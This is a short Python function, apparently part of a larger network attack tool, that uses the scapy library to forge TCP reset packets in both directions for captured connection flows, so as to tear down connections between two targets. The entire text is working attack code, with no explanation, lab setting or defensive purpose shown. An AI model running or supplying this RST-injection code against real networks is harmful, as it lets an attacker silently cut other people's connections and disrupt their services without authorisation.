from scapy.all import IP, TCP, send

def shutdown_connection(target1, target2, captured_flows):
    print(f"[!] Injecting TCP RSTs to terminate connections between {target1} and {target2}")
    for src, dst, sport, dport, seq, ack in captured_flows:
        rst1 = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="R", seq=seq)
        send(rst1, verbose=False)
        rst2 = IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="R", seq=ack)
        send(rst2, verbose=False)
